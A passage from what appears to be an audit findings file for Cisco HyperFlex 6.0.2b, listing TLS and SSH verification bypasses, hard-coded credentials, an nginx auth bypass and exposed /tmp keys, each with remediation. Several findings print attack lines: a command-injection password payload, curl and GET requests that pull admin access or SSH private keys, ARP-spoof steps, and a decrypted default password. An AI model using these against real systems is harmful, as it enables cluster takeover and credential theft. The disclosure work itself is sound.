        "   verify='/etc/hyperflex/certs/cluster-ca.pem' (the cluster CA cert path).\n"
        "3. Remove requests.packages.urllib3.disable_warnings(InsecureRequestWarning) — "
        "   suppressing warnings hides the insecure state from operators.\n"
        "4. Rotate the X-RootSessionID token (root_file.pub) at minimum on cluster "
        "   upgrade and preferably on each session boundary; bind it to the issuing "
        "   node's IP so replay from a different host is rejected.\n"
        "5. Pin the cluster management CA certificate in the stCli egg and validate "
        "   the server's certificate chain against it on every connection."
    ),
}

HX_F148 = {
    "id": "HX-F148",
    "title": (
        "TLS Certificate Verification Disabled in Upgrade REST Client "
        "(swagger_api_client.py) Exposes X-RootSessionID and Credentials to MITM "
        "During Cluster Upgrade Operations"
    ),
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-mgmt / storfs-upgrade-bootstrap",
    "file": "opt/hyperflex/restClientModule/swagger_api_client.py",
    "lines": "101-114, 210",
    "description": (
        "The HyperFlex upgrade REST client (SwaggerClient in swagger_api_client.py) "
        "disables TLS certificate verification at three distinct points, then "
        "transmits the X-RootSessionID admin token and authentication credentials "
        "over the unverified TLS session during cluster upgrade operations.\n\n"
        "Lines 101-102: 'pkg.rest.urllib3.disable_warnings()' suppresses SSL "
        "certificate warnings globally for the swagger package, and "
        "'pkg.configuration.verify_ssl = False' disables certificate verification "
        "at the package configuration level for all subsequent requests.\n\n"
        "Lines 107-108: A local Configuration() object for swagger_coreapi is "
        "instantiated with 'configuration.verify_ssl = False', disabling "
        "verification for cluster lifecycle management, cluster monitoring, "
        "inventory discovery, and internal API endpoints.\n\n"
        "Lines 113-114: A local AgentConfiguration() object for swagger_upgrade_agent "
        "is instantiated with 'agentConfig.verify_ssl = False', disabling "
        "verification for all upgrade agent REST calls.\n\n"
        "Line 133: The X-RootSessionID token (read from "
        "/etc/hyperflex/secure/root_file.pub via get_local_root_session_id()) "
        "is set as a default header on every API call made through the "
        "unverified client: "
        "'rest_conn.set_default_header(header_name=\"X-RootSessionID\", "
        "header_value=root_session_id)'. An adjacently-positioned MiTM attacker "
        "can intercept this token during any upgrade operation and use it to "
        "gain admin access to all HyperFlex management APIs (see HX-F144).\n\n"
        "Line 210: The _get_auth_token() method invokes curl with the '-k' flag "
        "('curl ... -k') to request a JWT from the AAA endpoint at "
        "POST /aaa/v1/auth. The JSON body contains username and password "
        "fields; with certificate verification disabled, a MiTM attacker can "
        "capture plaintext credentials and the returned JWT in a single "
        "interception.\n\n"
        "Same vulnerability class as HX-F142 (stCli global TLS bypass) but "
        "limited to the upgrade code path; upgrade operations typically run "
        "with direct hypervisor access, making adjacent-network positioning "
        "feasible for an attacker with ESXi host access."
    ),
    "proof": (
        "# Confirm verify_ssl = False in upgrade REST client:\n"
        "grep -n 'verify_ssl' "
        "/opt/hyperflex/restClientModule/swagger_api_client.py\n"
        "# Expected: lines 102, 108, 114 all set verify_ssl = False\n\n"
        "# Confirm X-RootSessionID sent with disabled verification:\n"
        "grep -n 'X-RootSessionID\\|verify_ssl\\|disable_warnings' "
        "/opt/hyperflex/restClientModule/swagger_api_client.py\n\n"
        "# Confirm curl -k in auth token request:\n"
        "grep '_get_auth_token\\|curl.*-k' "
        "/opt/hyperflex/restClientModule/swagger_api_client.py\n"
        "# MiTM interception during upgrade: position on management VLAN,\n"
        "# ARP-spoof between CVM nodes; capture X-RootSessionID in REST headers\n"
        "# and JWT + credentials from AAA auth request body."
    ),
    "remediation": (
        "1. Remove all 'verify_ssl = False' assignments; set 'verify_ssl = True' "
        "   (the urllib3/swagger default). Bundle the HyperFlex internal CA "
        "   certificate and set 'ssl_ca_cert' to its path in each Configuration "
        "   object.\n"
        "2. Replace 'curl ... -k' with 'curl --cacert /etc/hyperflex/secure/ca.pem' "
        "   or use the requests library with 'verify=/path/to/ca.pem'.\n"
        "3. Remove 'urllib3.disable_warnings()' — these warnings exist precisely "
        "   to flag certificate validation failures in logs.\n"
        "4. Apply the same remediation class as HX-F142: no HyperFlex internal "
        "   service should disable TLS certificate verification."
    ),
}

HX_F149 = {
    "id": "HX-F149",
    "title": (
        "TLS Certificate Verification Disabled in switchToArbitrator.py "
        "Exposes X-RootSessionID Token During Stretched Cluster Switchover"
    ),
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-stretched",
    "file": "usr/share/hyperflex/storfs-stretched/switchToArbitrator.py",
    "lines": "134",
    "description": (
        "The stretched cluster switchover script (switchToArbitrator.py) disables "
        "TLS certificate verification for all REST calls via 'verify=False' in the "
        "'restWithRetry' function (line 134): "
        "'resp = restFn(url=restUrl, data=data, auth=auth, headers=headers, verify=False)'. "
        "This applies to all calls routed through 'runRestQuery()' — every REST "
        "endpoint queried during the switchover workflow.\n\n"
        "The 'runRestQuery()' function (lines 111-115) injects 'X-RootSessionID' "
        "as a default header on every call. The ROOT_SESSION_ID is read at startup "
        "from '/etc/hyperflex/secure/root_file.pub' (line 163). With certificate "
        "verification disabled, an adjacently-positioned MiTM attacker can intercept "
        "this admin token during any stretched cluster switchover operation, gaining "
        "full admin access to all HyperFlex management APIs (see HX-F144).\n\n"
        "Same vulnerability class as HX-F142 (stCli global TLS bypass) and HX-F148 "
        "(upgrade client TLS bypass). This path is triggered during "
        "decommissioning of the Witness VM and migration to an Intersight or "
        "custom arbitrator — an infrequent but high-privilege operation."
    ),
    "proof": (
        "# Confirm verify=False in restWithRetry:\n"
        "grep -n 'verify' "
        "/usr/share/hyperflex/storfs-stretched/switchToArbitrator.py\n"
        "# Expected: line 134: verify=False in the restFn call\n\n"
        "# Confirm X-RootSessionID sent with verify=False:\n"
        "grep -n 'X-RootSessionID\\|ROOT_SESSION_ID' "
        "/usr/share/hyperflex/storfs-stretched/switchToArbitrator.py\n"
        "# MiTM during switchover: position on management VLAN,\n"
        "# ARP-spoof between CVM and target endpoint,\n"
        "# capture X-RootSessionID from the request headers."
    ),
    "remediation": (
        "1. Remove 'verify=False' from the 'restFn' call in 'restWithRetry'; "
        "   pass 'verify=/etc/hyperflex/secure/ca.pem' (the internal CA bundle) "
        "   to validate server certificates.\n"
        "2. Apply the same fix class as HX-F142 and HX-F148: no HyperFlex internal "
        "   client should disable TLS certificate verification."
    ),
}




HX_F156 = {
    "id": "HX-F156",
    "title": (
        "Systemic TLS Certificate Verification Bypass Across "
        "HyperFlex Management Scripts in storfs-misc"
    ),
    "severity": "HIGH",
    "cvss_score": 7.4,
    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-misc",
    "file": (
        "usr/share/hyperflex/storfs-misc/hx-scripts/add_vswitch.py, "
        "usr/share/hyperflex/storfs-misc/hx-scripts/esx_util.py, "
        "usr/share/hyperflex/storfs-misc/hx-scripts/iscsiVolumeAccessCheck.py, "
        "usr/share/hyperflex/storfs-misc/pci_passthru.py, "
        "usr/share/hyperflex/storfs-misc/hx-scripts/install_vc_plugin.py, "
        "usr/share/hyperflex/storfs-misc/hx-scripts/check_vswitch.py, "
        "usr/share/hyperflex/storfs-misc/hx-scripts/node_replace.py"
    ),
    "lines": "multiple per file",
    "description": (
        "TLS certificate verification is disabled systemically across the entire "
        "management script layer in the storfs-misc package. This is not an "
        "isolated oversight — it is a repeated architectural pattern across at "
        "least 7 scripts that collectively cover vSwitch configuration, ESX "
        "connectivity checks, iSCSI volume access, PCI passthrough, vCenter "
        "plugin installation, node replacement, and HX REST API access.\n\n"
        "Techniques used across the affected scripts:\n\n"
        "1. Global SSL context monkey-patch (3 scripts): "
        "'ssl._create_default_https_context = ssl._create_unverified_context' — "
        "disables cert validation for ALL SSL connections in the process\n"
        "  - add_vswitch.py lines 15, 21\n"
        "  - esx_util.py lines 41, 47\n"
        "  - iscsiVolumeAccessCheck.py lines 36, 42\n\n"
        "2. Per-request verify=False (4 scripts): "
        "'requests.get/post(..., verify=False)' — disables cert validation for "
        "specific requests\n"
        "  - check_vswitch.py lines 397, 510, 522, 532, 547 "
        "(sends 'admin' credentials with verify=False)\n"
        "  - install_vc_plugin.py line 386 "
        "(sends 'admin' credentials with verify=False)\n"
        "  - esx_util.py line 247 (sends 'admin' credentials with verify=False)\n"
        "  - node_replace.py lines 182, 193, 256, 296, 314 "
        "(sends 'root' credentials with verify=False)\n\n"
        "3. urllib3 warning suppression (3 scripts): "
        "'requests.packages.urllib3.disable_warnings()' — hides SSL errors in logs\n"
        "  - esx_util.py line 27\n"
        "  - install_vc_plugin.py line 26\n"
        "  - check_vswitch.py line 29\n\n"
        "Combined: admin and root credentials for ESX, vCenter, and HyperFlex "
        "REST APIs are transmitted over TLS without certificate verification in "
        "every management operation covered by these scripts. An adjacently-"
        "positioned MiTM attacker on the management or data network can present "
        "a self-signed certificate and capture ESX root passwords, vCenter admin "
        "credentials, and HyperFlex API tokens during any of these operations.\n\n"
        "This finding documents the systemic scope of the same vulnerability "
        "class already documented in HX-F142 (stCli), HX-F148 (upgrade client), "
        "HX-F149 (switchToArbitrator), and HX-F151 (config-ctlvm). Every layer "
        "of the management stack disables TLS verification."
    ),
    "proof": (
        "# Confirm systemic verify=False pattern across management scripts:\n"
        "grep -rn 'verify=False\\|_create_unverified\\|disable_warnings' "
        "/usr/share/hyperflex/storfs-misc/hx-scripts/ "
        "/usr/share/hyperflex/storfs-misc/pci_passthru.py\n"
        "# Expected: hits in add_vswitch.py, esx_util.py, iscsiVolumeAccessCheck.py,\n"
        "# pci_passthru.py, install_vc_plugin.py, check_vswitch.py, node_replace.py\n\n"
        "# Confirm admin credentials sent with verify=False:\n"
        "grep -n 'verify=False' /usr/share/hyperflex/storfs-misc/hx-scripts/check_vswitch.py\n"
        "# Expected: auth=('admin', password), verify=False at multiple call sites"
    ),
    "remediation": (
        "1. Establish an internal CA trust chain: bundle the HyperFlex internal "
        "   CA certificate in the storfs-misc package and pass "
        "'verify=/etc/hyperflex/secure/ca.pem' to all requests calls.\n"
        "2. Remove all 'ssl._create_default_https_context = "
        "   ssl._create_unverified_context' monkey-patches. Python's default "
        "   SSL context validates certificates.\n"
        "3. Remove all 'urllib3.disable_warnings()' calls — SSL warnings exist "
        "   to surface certificate errors for investigation.\n"
        "4. Implement a shared utility function for authenticated HTTPS requests "
        "   with proper certificate validation, and replace all verify=False "
        "   instances with calls to this utility.\n"
        "5. Apply the same fix class to HX-F142, HX-F148, HX-F149, HX-F151 — "
        "   this is a systemic architectural issue requiring a systemic fix, not "
        "   per-file patches."
    ),
}

HX_F157 = {
    "id": "HX-F157",
    "title": "SSH Host Key Validation Bypass via paramiko.AutoAddPolicy() in STIG Enforcement Scripts",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "stig_security_settings.py, stig_security_settings_hx.py, post_install.py",
    "description": (
        "Three scripts use paramiko.AutoAddPolicy() for SSH connections, silently accepting any "
        "host key without verification. The affected scripts are the STIG compliance enforcement "
        "tools — the very components responsible for applying security hardening across cluster nodes. "
        "An attacker with a position between the controller VM and an ESXi host can intercept the "
        "SSH session used to apply STIG settings, exfiltrate root credentials, and suppress or "
        "forge the compliance commands. The same pattern appears in checkSSHLogin() and sshToHost() "
        "in stig_security_settings.py (lines 364, 382), stig_security_settings_hx.py (lines 476, "
        "494), and post_install.py (line 712)."
    ),
    "evidence": [
        "stig_security_settings.py:364: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "stig_security_settings.py:382: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "stig_security_settings.py:383: ssh.connect(host, username=username, password=password)",
        "stig_security_settings.py:406: sshToHost(host, 'root', password, cmd)  # applies PAM changes",
        "stig_security_settings_hx.py:476: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "stig_security_settings_hx.py:494: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "post_install.py:712: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "stig_security_settings.py:32: ssl._create_default_https_context = _create_unverified_https_context  # co-present",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace AutoAddPolicy() with RejectPolicy() or WarningPolicy(). Load known host keys from "
        "a pre-seeded known_hosts file before connecting. The STIG scripts should themselves be held "
        "to STIG SSH host-key requirements."
    ),
    "tags": ["ssh", "mitm", "stig", "paramiko", "host-key", "cwe-295"],
}

HX_F167 = {
    "id": "HX-F167",
    "title": "TLS Verification Disabled in Ansible Playbook curl Calls for Security-Critical ctlVM Operations",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-deploy/ansible/roles/postinstall_controllervm/tasks/configure.yml, storagenode.yml",
    "description": (
        "Multiple Ansible playbook tasks invoke curl with the -k flag (disable TLS verification) "
        "when communicating with the storage controller VM securityservice endpoints. The affected "
        "operations include: removing authentication keys (POST /securityservice/v1/removeauthkey), "
        "setting a security baseline (POST /securityservice/v1/sfi/baseline), enabling SSH access "
        "(PUT /securityservice/v1/secureshell), and cluster registration. These are called with "
        "admin credentials (-u admin:{{ ctlvmPassword | b64decode }}) over unverified TLS. "
        "An attacker performing MITM can intercept auth key removal, inject their own auth key, "
        "modify the security baseline before it is applied, or extract admin credentials. "
        "The -k pattern extends the systemic TLS bypass (HX-F156) from Python scripts to "
        "Ansible playbook curl calls, covering the deployment and provisioning pipeline."
    ),
    "evidence": [
        "configure.yml:31: curl -k ... DELETE /securityservice/v1/removeauthkey -u admin:{{ ctlvmPassword | b64decode }}",
        "configure.yml:57: curl -k ... POST /securityservice/v1/sfi/baseline -u admin:{{ ctlvmPassword | b64decode }}",
        "configure.yml:69: curl -k ... PUT /securityservice/v1/secureshell?status=true -u admin:{{ ctlvmPassword }}",
        "storage_client.yml:49: curl -k ... POST /securityservice/v1/configurescn -u admin:{{ ctlvmPassword }}",
        "storagenode.yml:44: curl -k ... GET /securityservice/v1/secureshell -u admin:{{ ctlvmPassword | b64decode }}",
        "storagenode.yml:77: curl -k ... GET /coreapi/v1/clusters -u admin:{{ ctlvmPassword | b64decode }}",
        "configure.yml:43: curl -k ... DELETE /securityservice/v1/removeauthkey for ansible user",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the -k flag from all curl invocations in Ansible playbooks. Pin the ctlVM TLS "
        "certificate or add the CA cert to curl's certificate store (--cacert). If a self-signed "
        "cert is used, pre-distribute the cert fingerprint and use --pinnedpubkey instead."
    ),
    "tags": ["tls-bypass", "ansible", "curl", "securityservice", "cwe-295", "deploy"],
}

HX_F168 = {
    "id": "HX-F168",
    "title": "Deployment API Hard-Coded Credential Default and TLS Bypass in deployNodes.py",
    "severity": "HIGH",
    "cvss": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-798",
    "component": "storfs-deploy/ansible/deployNodes.py",
    "description": (
        "deployNodes.py retrieves the installer password at module load time via "
        "parseEnvVariableTunes('credentials.installer_passwd'), which decrypts to 'Cisco123' "
        "(same AES key and tunes file as HX-F159). This decrypted password is then set as the "
        "default value for the --password command-line option (line 44). When invoked without "
        "an explicit --password argument, all REST API calls to the deployment appliance "
        "(https://<appliance>/rest/deployment/) authenticate with root:Cisco123. Additionally, "
        "every requests call in the file uses verify=False explicitly, and the script calls "
        "requests.packages.urllib3.disable_warnings() at startup to suppress the resulting "
        "InsecureRequestWarning. An attacker with network access to the deployment appliance "
        "can authenticate with the default credentials during or after deployment. The "
        "verify=False pattern means MITM can intercept the deployment API session and manipulate "
        "cluster configuration payloads. The disable_warnings() call ensures no logs or terminal "
        "output reflects the insecure TLS state."
    ),
    "evidence": [
        "deployNodes.py:14: sys.path.append('/usr/share/hyperflex/storfs-misc/')",
        "deployNodes.py:17: from springpath_env_parse import parseEnvVariableTunes",
        "deployNodes.py:28: INSTALLER_PASSWD = parseEnvVariableTunes('credentials.installer_passwd')",
        "deployNodes.py:43-44: p.add_option('--password', dest='password', default=INSTALLER_PASSWD, ...)",
        "deployNodes.py:88: requests.packages.urllib3.disable_warnings()",
        "deployNodes.py:147: authData=(opts.user, opts.password)  # user defaults to 'root'",
        "deployNodes.py:148: r = requests.get(deploymentsUrl, auth=authData, verify=False)",
        "deployNodes.py:154: r = requests.get(progressUrl, auth=authData, verify=False)",
        "deployNodes.py:157: r = requests.post(checkDeployNodesUrl, ..., auth=authData, verify=False, ...)",
        "deployNodes.py:160: r = requests.post(deployNodesUrl, ..., auth=authData, verify=False, ...)",
        "springpath_default.tunes: installer_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU= -> 'Cisco123'",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Require --password to be explicitly provided; do not default to the tunes credential. "
        "Remove verify=False from all requests calls and trust the system CA store or pin the "
        "deployment appliance certificate. Remove disable_warnings() — warnings exist for a reason. "
        "Rotate the installer_passwd from the firmware-wide default."
    ),
    "tags": ["hardcoded-creds", "tls-bypass", "deploy", "installer", "cwe-798", "cwe-295", "requests"],
}

HX_F170 = {
    "id": "HX-F170",
    "title": "Host Key Trust Bypass and Hard-Coded Default Credential in RDM Management SSH Connections",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-deploy/ansible/configureRDMs.py",
    "description": (
        "configureRDMs.py contains two functions — offlineRDMsinGuest() and hardBlackListDisks() "
        "— that connect to storage controller VMs via SSH using paramiko.AutoAddPolicy(), "
        "which accepts any host key without verification. Both functions fetch the ctlVM password "
        "via parseEnvVariableTunes('credentials.stctl_vm_passwd'), which decrypts to 'Cisco123' "
        "(the firmware-wide default, as confirmed in HX-F159). A network attacker who can "
        "intercept SSH traffic on the storage management network during an RDM configuration "
        "operation can impersonate the target ctlVM, receive the SSH connection (AutoAddPolicy "
        "accepts the attacker's host key), and capture root:Cisco123 credentials. The attacker "
        "can then replay those credentials against any node in the cluster."
    ),
    "evidence": [
        "configureRDMs.py:399: client.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "configureRDMs.py:401: guest_passwd = parseEnvVariableTunes('credentials.stctl_vm_passwd')",
        "configureRDMs.py:402: client.connect(hostname, username=guest_uname, password=guest_passwd)",
        "configureRDMs.py:425: client.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "configureRDMs.py:427: guest_passwd = parseEnvVariableTunes('credentials.stctl_vm_passwd')",
        "configureRDMs.py:428: client.connect(hostname, username=guest_uname, password=guest_passwd)",
        "springpath_default.tunes: stctl_vm_passwd -> 'Cisco123' (see HX-F159)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace AutoAddPolicy with known_hosts or certificate-pinned host key verification. "
        "Rotate stctl_vm_passwd from the firmware default before any production deployment."
    ),
    "tags": ["ssh-host-key", "hardcoded-creds", "rdm", "paramiko", "cwe-295", "cwe-798"],
}

HX_F171 = {
    "id": "HX-F171",
    "title": "OS Command Injection via Unsanitized Password in scpFile.py Shell Invocation",
    "severity": "HIGH",
    "cvss": 8.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-78",
    "component": "storfs-deploy/ansible/library/scpFile.py",
    "description": (
        "scpFile.py constructs an scp command by string-concatenating user-supplied parameters "
        "(remotevm_password, remotevm_hostname, remotevm_username, filename, dest) and executes "
        "the result with subprocess.Popen(cmd, shell=True). No sanitization or quoting is applied "
        "to any parameter. An attacker who can invoke this Ansible module with a crafted "
        "remotevm_password value (e.g. `x; id > /tmp/pwned #`) achieves arbitrary command "
        "execution with the privileges of the Ansible runner process. Additionally, "
        "`sshpass -p <password>` exposes the plaintext password in the process argument list "
        "for the duration of the transfer (CWE-214), and -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null disables all SSH host key verification (CWE-295)."
    ),
    "evidence": [
        "scpFile.py:112: cmd = 'sshpass -p '+remotevm_password+' scp -q -o StrictHostKeyChecking=no ...' + remotevm_username+'@'+remotevm_hostname+':'+filename+' '+dest",
        "scpFile.py:116: p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, ...)",
        "scpFile.py:69: remotevm_password=dict(required=True, type='str', no_log=True)  # no sanitization",
        "scpFile.py:112-114: all 5 user-supplied params string-concatenated into shell command",
        "Payload example: remotevm_password='x; touch /tmp/pwnd; #' -> executes touch /tmp/pwnd",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace shell=True with a list-form Popen invocation — pass each argument as a separate "
        "list element so the shell never interprets them. Use paramiko SCP or native Python SCP "
        "libraries instead of sshpass subprocess. Remove StrictHostKeyChecking=no."
    ),
    "tags": ["command-injection", "scp", "shell", "sshpass", "cwe-78", "cwe-214", "cwe-295"],
}


HX_F176 = {
    "id": "HX-F176",
    "title": "Privileged Proxy Port 8997 Binds to All Interfaces; nginx Auto-Injects Admin Session ID",
    "severity": "CRITICAL",
    "cvss": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-284",
    "component": "storfs-misc/rest_internal.conf, storfs-misc/restintport.cfg, storfs-misc/genrestconf.sh",
    "description": (
        "rest_internal.conf configures nginx to listen on port 8997 (from restintport.cfg) "
        "with `listen *:PORT ssl` — binding to ALL network interfaces, not just loopback. "
        "For every request received on port 8997, nginx automatically injects "
        "`proxy_set_header X-RootSessionID <session_id>` before proxying to the backend "
        "at localhost:8000 (management API). nginx proxy_set_header overwrites any "
        "client-supplied X-RootSessionID with the real admin session ID. "
        "Consequently, ANY client that can establish a TCP connection to port 8997 "
        "on any ctlVM interface receives admin-level authenticated access to the full "
        "HyperFlex REST API (/rest, /aaa, /coreapi, /dataprotection, /backupservice, "
        "/encryption, /volume, /securityservice, /supportservice, /slservice, /upgrade, "
        "/upload, /stMgr) without supplying credentials. "
        "Port 8997 is used by the stCli tool from remote hosts (stCli.sh: "
        "springpath_host=clusterIp; springpath_port=8997) confirming the port is "
        "network-accessible. The design intent comment ('Data network on custom port') "
        "assumes network isolation, but the binding is *:8997 — no interface restriction. "
        "An attacker on any network segment that can reach the ctlVM on port 8997 "
        "has unauthenticated admin access to the entire cluster management API."
    ),
    "evidence": [
        "rest_internal.conf:4: listen *:PORT ssl;  # PORT=8997 from restintport.cfg",
        "restintport.cfg: PORT=8997",
        "rest_internal.conf:42: proxy_set_header X-RootSessionID SESSIONID;  # injected for ALL requests",
        "rest_internal.conf:72: proxy_set_header X-RootSessionID SESSIONID;  # stMgr path also",
        "genrestconf.sh: comment: 'binding is available only for Data network on custom port'",
        "stCli.sh:12: export springpath_host=${clusterIp}; export springpath_port=8997",
        "Attack: curl -k https://<ctlvm>:8997/coreapi/v1/clusters -> 200 admin response",
        "rest_internal.conf covers: /rest /aaa /coreapi /dataprotection /backupservice /encryption /volume /securityservice /supportservice /slservice /upgrade /upload /stMgr",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Change `listen *:PORT ssl` to `listen 127.0.0.1:PORT ssl` to restrict port 8997 "
        "to loopback only. The stCli tool should connect via the standard port 443 with "
        "explicit credentials rather than the privileged proxy port. "
        "If the data network must be used, bind explicitly to the data interface IP "
        "rather than wildcard, and add a firewall rule restricting access to the ctlVM itself."
    ),
    "tags": ["auth-bypass", "privileged-port", "nginx", "session-injection", "network", "cwe-284", "critical"],
}

HX_F177 = {
    "id": "HX-F177",
    "title": "Unauthenticated Access to /tmp/ Directory via Unauthenticated /sbdl/ nginx Path",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-284",
    "component": "storfs-misc/nginx.conf",
    "description": (
        "nginx.conf maps the /sbdl/ path to the system /tmp/ directory with no "
        "authentication: `location /sbdl/ { alias /tmp/; auth_basic off; }`. "
        "Any file in /tmp/ is downloadable by an unauthenticated remote attacker via "
        "`GET http://<ctlvm>/sbdl/<filename>`. This path was intended for support bundle "
        "downloads but the directory alias exposes the entire /tmp/ tree. "
        "Critical files known to be written to /tmp/ during normal operations: "
        "(1) `/tmp/sshKeyPair*.json` — SSH private keys for all storage controller VMs "
        "(generated by generateSshKeys.py, referenced in commonFunctions.py and "
        "0007_create_authorized_keys_for_admin_ESX.py — HX-F164/HX-F169); "
        "(2) `/tmp/upgradeHooksCreds*.json` — plaintext ESX username and password "
        "(referenced in all upgrade hook scripts — HX-F169); "
        "(3) `/tmp/nodeInventory*.json` — cluster node topology; "
        "(4) `/tmp/clusterConfig*.json` — cluster configuration data. "
        "An attacker who sends GET requests to /sbdl/ during a cluster upgrade or "
        "node replacement operation recovers SSH private keys for all nodes and ESX "
        "credentials without authentication."
    ),
    "evidence": [
        "nginx.conf:63-66: location /sbdl/ { alias /tmp/; auth_basic off; }",
        "commonFunctions.py:645: credsFile = getMatchingFileName('/tmp/sshKeyPair*.json')",
        "generateSshKeys.py:46: sshKeysFileHandle, sshKeysFile = mkstemp(suffix='.json', prefix='sshKeyPair', dir='/tmp')",
        "0007_create_authorized_keys_for_admin_ESX.py:20: JSON_CREDS_FILE_MATCH = '/tmp/upgradeHooksCreds*.json'",
        "Attack: GET http://<ctlvm>/sbdl/sshKeyPair<random>.json -> SSH private key for all nodes",
        "Attack: GET http://<ctlvm>/sbdl/upgradeHooksCreds<random>.json -> ESX plaintext credentials",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Restrict /sbdl/ to specific filenames matching the support bundle pattern "
        "(e.g. `location ~ ^/sbdl/supportBundle-[a-zA-Z0-9_-]+\\.tar\\.gz$`) rather "
        "than aliasing the entire /tmp/ directory. "
        "Move SSH key files, credential files, and node inventory files out of /tmp/ "
        "to a directory that is not nginx-served. "
        "If /tmp/ aliasing is necessary for legacy reasons, add auth_basic with credentials "
        "or restrict with `allow 127.0.0.1; deny all`."
    ),
    "tags": ["auth-bypass", "file-read", "tmp", "nginx", "ssh-keys", "cwe-284", "critical"],
}


HX_F188 = {
    "id": "HX-F188",
    "title": "Unauthenticated Access to Web Access Logs via /logs nginx Path",
    "severity": "MEDIUM",
    "cvss": 5.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "cwe": "CWE-284",
    "component": "storfs-misc/nginx.conf",
    "description": (
        "nginx.conf maps the `/logs` path to `/var/www/localhost/logs` without "
        "authentication: `auth_basic off; allow all; alias /var/www/localhost/logs`. "
        "HTTP access logs for the management web interface are readable by any "
        "unauthenticated remote client. "
        "Access logs record: API endpoint paths (/coreapi/v1/clusters/, "
        "/rest/v1/clusters/, etc.), client IP addresses, HTTP methods, response "
        "codes, and response sizes. Depending on the nginx log_format configuration, "
        "these logs may also include: request headers (Authorization, X-RootSessionID), "
        "query strings containing sensitive parameters, and user agent strings. "
        "Because `auditHttpVerbsToSkip = ['GET']` (HX-F178) means GET operations "
        "are not audited by the management application, the nginx access log may be "
        "the only record of read operations — and it is accessible without credentials. "
        "Logs are accessible at `http://<ctlvm>/logs/<logfilename>` — log filenames "
        "are typically predictable (access.log, access.log.1, etc.)."
    ),
    "evidence": [
        "nginx.conf: location /logs { auth_basic off; allow all; alias /var/www/localhost/logs; }",
        "auth-war application.conf:49: auditHttpVerbsToSkip = ['GET'] (GET audit gap HX-F178)",
        "HTTP access logs may contain Authorization bearer tokens and X-RootSessionID values",
        "Attack: GET http://<ctlvm>/logs/access.log -> API call history without credentials",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Restrict access to `/logs` using `auth_basic` with proper credentials, or "
        "`allow 127.0.0.1; deny all` to limit to localhost-only access. "
        "Review the nginx `log_format` to ensure token values and sensitive headers "
        "are not logged. "
        "If external log access is required, serve logs via an authenticated endpoint."
    ),
    "tags": ["log-access", "auth-bypass", "nginx", "cwe-284", "medium"],
}

HX_F190 = {
    "id": "HX-F190",
    "title": "Unauthenticated Access to Support Bundle Directory via /support nginx Path",
    "severity": "HIGH",
    "cvss": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-284",
    "component": "storfs-misc/nginx.conf",
    "description": (
        "nginx.conf maps `/support` to `/var/support/` without authentication: "
        "`auth_basic off; allow all; alias /var/support/`. "
        "HyperFlex support bundles are stored in `/var/support/` and contain: "
        "cluster configuration data, network topology, node inventory, log files "
        "(including the API access logs from `/var/www/localhost/logs/`), "
        "and potentially configuration files with sensitive data. "
        "Support bundles are automatically generated during diagnostics and "
        "upgrade operations. An attacker can download the full support bundle "
        "at `http://<ctlvm>/support/<bundle_filename>` without credentials. "
        "Support bundle filenames are typically timestamped and predictable in format. "
        "Chain with HX-F178 (GET audit gap): the download leaves no audit trail."
    ),
    "evidence": [
        "nginx.conf: location /support { auth_basic off; allow all; alias /var/support/; }",
        "Support bundles contain cluster config, logs, and node inventory",
        "Attack: GET http://<ctlvm>/support/<bundle>.tar.gz -> full diagnostic data exfil",
